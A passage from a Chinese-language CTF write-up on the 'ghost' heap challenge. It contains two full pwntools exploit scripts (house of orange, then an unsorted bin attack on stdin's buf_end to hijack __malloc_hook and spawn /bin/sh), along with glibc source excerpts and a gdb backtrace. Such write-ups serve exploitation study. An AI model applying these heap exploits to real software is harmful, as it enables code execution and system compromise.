        newheap("1")
        delheap(1)
        delheap(0)
        # heap_0=>fake_chunk
        addghost(1,p64(0) + p64(system_addr))
        payload = p64(aim_addr) + p64(aim_addr)
        payload += "0"*0x30 + p64(0) + p64(0x111) + p64(fd) + p64(bk)
        newheap(payload)
        newheap("dddddd")
        delheap(2)
        newheap(2)
        delheap(1)
        payload = p64(0xffffffffffffffff) + p64(0)*2 + p64(heap_addr+0x18-0x18)
        newheap(payload)
        delheap(0)
        delheap(2)
        payload = "0"*0x40 + "/bin/shx00" + p64(0x61) + p64(0) + p64(io_addr-0x10) + p64(2) + p64(3)
        newheap(payload)
        p.recvuntil("Your choice: ")
        p.sendline("1")
    if __name__=='__main__':
        unsorted_addr, libc_addr = leak_libc()
        system_addr = libc_addr + libc.symbols['system']
        io_addr = unsorted_addr + 0x9a8
        free_hook_addr = libc_addr + libc.symbols['__free_hook']
        heap_addr = leak_heap()
        log.success("unsorted_addr: %s"%(hex(unsorted_addr)))
        log.success("system_addr: %s"%(hex(system_addr)))
        log.success("free_hook_addr: %s"%(hex(free_hook_addr)))
        log.success("heap_addr: %s"%(hex(heap_addr)))
        log.success("io_addr: %s"%(hex(io_addr)))
        raw_input()
        houseoforange(heap_addr)
        p.interactive()
**4\. 正解思路**
****
上面的 **houseoforange** 其实已经接近正解了，但是由于 **libc** 的原因所以没法实现。 正解思路是利用 **unsorted
bin attck** 来覆盖 **stdin** 的 **buf_end** ，由于 **unsorted bin** 的位置是在
**main_arena** 中，所以在 **scanf** 中调用 **ead (fp- >_fileno, buf,
size))**来将数据先读入缓冲区这里会使得 **size=unsorted bin-buf_base** ，于是可以篡改 **stdin** 到
**unsorted bin** 中的所有数据，也包括 **malloc_hook** 的指向，最终实现 **getshell**
，下面我们从源码层面分析一下： 首先跟踪一下 **scanf** 的源码，看一下如何走到 **read** 函数。 在
**_IO_vfscanf_internal** 先调用了一下 **inchar**
    618	      
    619	      fc = *f++;
    620	      if (skip_space || (fc != L_('[') && fc != L_('c')
    621	                         && fc != L_('C') && fc != L_('n')))
    622	        {
    623	          
    624	          int save_errno = errno;
    625	          __set_errno (0);
    626	          do
    627	            
    631	            if (__builtin_expect ((c == EOF || inchar () == EOF) // 读入字符
    632	                                  && errno == EINTR, 0))
    633	              input_error ();
    634	          while (ISSPACE (c));
    635	          __set_errno (save_errno);
    636	          ungetc (c, s);
    637	          skip_space = 0;
    638	        }
看一下 **inchar** 的定义，发现这里调用了 **_IO_getc_unlocked** ，而 **_IO_getc_unlocked** 调用了
**__uflow**
    117	# define inchar()        (c == EOF ? ((errno = inchar_errno), EOF)              
    118	                         : ((c = _IO_getc_unlocked (s)),                      
    119	                            (void) (c != EOF                                      
    120	                                    ? ++read_in                                      
    121	                                    : (size_t) (inchar_errno = errno)), c))
    400	#define _IO_getc_unlocked(_fp) 
    401	       (_IO_BE ((_fp)->_IO_read_ptr >= (_fp)->_IO_read_end, 0) 
    402	        ? __uflow (_fp) : *(unsigned char *) (_fp)->_IO_read_ptr++)
那么可以参考一下我在博客中[unflow的分析，可以知道它会调用 **_IO_new_file_underflow** ，并调用
**_IO_file_read** ，最终调用 **__read (fp- >_fileno, buf, size))**来将数据先读入缓冲区，这时
**fp_fileno** 指向 **stdin** , **buf** 指向 **buf_base** ，而 **size=buf_end-buf_base** 。 可以看下 **angelboy** 给的原理图：
除了修改 **buf_end** 之外，还需要不让函数报错，一个是 **_IO_vfscanf_internal** 中的
    3021	  UNLOCK_STREAM (s);
需要让 **lock** 合法，另一个就是要通过 **vtable** 的校验。 最终跳转的地址是 **libc** 中一段可以 **getshell**
的位置，大致是调用了 **execve("/bin/sh",argv,env)** 。 最终exp如下，如果要改 **libc** 的话需要注意的是求
**libc** 地址的偏移，以及各个 **stdin** 属性的偏移：
    #!/usr/bin/env python
    # encoding: utf-8
    p = process("./ghost")
    libc = ELF("./libc.so.6")
    def newheap(data):
        p.recvuntil("Your choice: ")
        p.sendline("1")
        p.recvuntil("Data :")
        p.sendline(str(data))
    def delheap(index):
        p.recvuntil("Your choice: ")
        p.sendline("2")
        p.recvuntil("Index :")
        p.sendline(str(index))
    def addghost(magic, desc):
        p.recvuntil("Your choice: ")
        p.sendline("3")
        p.recvuntil("Magic :")
        p.sendline(str(magic))
        p.recvuntil("Description :")
        p.send(desc)
    def seeghost(magic):
        p.recvuntil("Your choice: ")
        p.sendline("4")
        p.recvuntil("Magic :")
        p.sendline(str(magic))
    def delghost():
        p.recvuntil("Your choice: ")
        p.sendline("5")
    def leak_libc():
        newheap("0")
        newheap("1")
        delheap(0)
        addghost(1,'1'*8)
        seeghost(1)
        ret = p.recvuntil('$')
        addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
        unsorted_addr = u64(addr)-0xa0
        libc_addr = (unsorted_addr & 0xfffffffff000)-0x3c1000
        delghost()
        delheap(1)
        return libc_addr
    def leak_heap():
        newheap("0")
        addghost(1,'1'*8+'2'*8)
        delghost()
        newheap("1")
        newheap("2")
        delheap(2)
        newheap("2")
        delheap(1)
        newheap("1")
        delheap(0)
        addghost(1,'1'*9)
        #delheap(0)
        seeghost(1)
        ret = p.recvuntil('$')
        addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
        heap_addr = (u64(addr)-0x31)
        delghost()
        delheap(1)
        delheap(2)
        return heap_addr
    def exploit(heap_addr):
        write_addr = heap_addr + 0x70
        aim_addr = heap_addr + 0xb0
        fd = write_addr - 0x18
        bk = write_addr - 0x10
        # malloc for 4
        newheap("0")
        addghost(1,'1')
        newheap("1")
        newheap("2")
        # unsortedbin(0x1c0) heap_2
        delghost()
        delheap(0)
        delheap(2)
        newheap("0")
        newheap("2")
        delheap(1)
        # heap_0 unsortedbin(0x100) nobody(0x10) heap_2
        delheap(0)
        newheap("0"*0xa0 + p64(0xb0))
        newheap("1")
        delheap(1)
        delheap(0)
        # heap_0=>fake_chunk
        addghost(1,"/bin/shx00")
        payload = p64(aim_addr) + p64(aim_addr)
        payload += "0"*0x30 + p64(0) + p64(0x111) + p64(fd) + p64(bk)
        newheap(payload)
        newheap("1")
        delheap(2)
        # now we have unsorted bin in heap_0
        # ghost(0x60) heap_0(0xb0)(unsorted bin here) smallbins heap_1
        newheap(2)
        delheap(1)
        newheap("0")
        delheap(0)
        # unsorted bin attack
        delheap(2)
        payload = "x00"*0x40 + p64(0) + p64(0xb1) + p64(0) + p64(buf_end_addr-0x10)
        newheap(payload)
        payload = ("x00"*5 + p64(lock_addr) + p64(0)*9 + p64(io_jump_addr)).ljust(0x1ad,"x00")+ p64(system_addr) # set stdin->buf_end = unsorted_bin_addr
        newheap(payload)
        delheap(0)
    if __name__=='__main__':
        libc_addr = leak_libc()
        system_addr = libc_addr + 0xf24cb
        malloc_hook_addr = libc_addr + libc.symbols['__malloc_hook']
        buf_end_addr = libc_addr + 0x3c1900
        lock_addr = libc_addr + 0x3c3770
        io_jump_addr = libc_addr + 0x3be400
        heap_addr = leak_heap()
        log.success("system_addr: %s"%(hex(system_addr)))
        log.success("malloc_hook_addr: %s"%(hex(malloc_hook_addr)))
        log.success("heap_addr: %s"%(hex(heap_addr)))
        log.success("stdin_addr: %s"%(hex(buf_end_addr)))
        #raw_input()
        exploit(heap_addr)
        p.interactive()
那么这里最后还有个问题，就是明明我们修改的是 **__malloc_hook** ，为啥最后是调用 **delheap**
来实现跳转的呢？这是因为在最后调用 **free** 的时候，出现了报错，所以调了 **malloc_printerr** 来打印错误，而这个函数是会调用
**malloc** 的，调用过程如下：
    #0  __GI___libc_malloc (bytes=bytes@entry=0x24) at malloc.c:2902
    #1  0x00007fdb8b341f5a in __strdup (s=0x7fff4018f390 "/lib/x86_64-lin"...) at strdup.c:42
    #2  0x00007fdb8b33d7df in _dl_load_cache_lookup (name=name@entry=0x7fdb8b0e7646 "libgcc_s.so.1") at dl-cache.c:311
    #3  0x00007fdb8b32e169 in _dl_map_object (loader=loader@entry=0x7fdb8b5494c0, name=name@entry=0x7fdb8b0e7646 "libgcc_s.so.1", type=type@entry=0x2, trace_mode=trace_mode@entry=0x0, mode=mode@entry=0x90000001, nsid=) at dl-load.c:2342
    #4  0x00007fdb8b33a577 in dl_open_worker (a=a@entry=0x7fff4018fa80) at dl-open.c:237
    #5  0x00007fdb8b335564 in _dl_catch_error (objname=objname@entry=0x7fff4018fa70, errstring=errstring@entry=0x7fff4018fa78, mallocedp=mallocedp@entry=0x7fff4018fa6f, operate=operate@entry=0x7fdb8b33a4d0, args=args@entry=0x7fff4018fa80) at dl-error.c:187
    #6  0x00007fdb8b339da9 in _dl_open (file=0x7fdb8b0e7646 "libgcc_s.so.1", mode=0x80000001, caller_dlopen=0x7fdb8b070b81, nsid=0xfffffffffffffffe, argc=, argv=, env=0x7fff401907a8) at dl-open.c:660
    #7  0x00007fdb8b09e56d in do_dlopen (ptr=ptr@entry=0x7fff4018fca0) at dl-libc.c:87
    #8  0x00007fdb8b335564 in _dl_catch_error (objname=0x7fff4018fc90, errstring=0x7fff4018fc98, mallocedp=0x7fff4018fc8f, operate=0x7fdb8b09e530, args=0x7fff4018fca0) at dl-error.c:187
    #9  0x00007fdb8b09e624 in dlerror_run (args=0x7fff4018fca0, operate=0x7fdb8b09e530) at dl-libc.c:46
    #10 __GI___libc_dlopen_mode (name=name@entry=0x7fdb8b0e7646 "libgcc_s.so.1", mode=mode@entry=0x80000001) at dl-libc.c:163
    #11 0x00007fdb8b070b81 in init () at ../sysdeps/x86_64/backtrace.c:52
    #12 __GI___backtrace (array=array@entry=0x7fff4018fd00, size=size@entry=0x40) at ../sysdeps/x86_64/backtrace.c:105
    #13 0x00007fdb8af7a9f5 in backtrace_and_maps (do_abort=, do_abort@entry=0x2, written=, fd=fd@entry=0x3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47
    #14 0x00007fdb8afd27e5 in __libc_message (do_abort=do_abort@entry=0x2, fmt=fmt@entry=0x7fdb8b0ebe98 "*** Error in `%"...) at ../sysdeps/posix/libc_fatal.c:172
    #15 0x00007fdb8afdb37a in malloc_printerr (ar_ptr=, ptr=, str=0x7fdb8b0ebff0 "free(): invalid"..., action=0x3) at malloc.c:5006
    #16 _int_free (av=, p=, have_lock=0x0) at malloc.c:3867
    #17 0x00007fdb8afdf53c in __GI___libc_free (mem=) at malloc.c:2968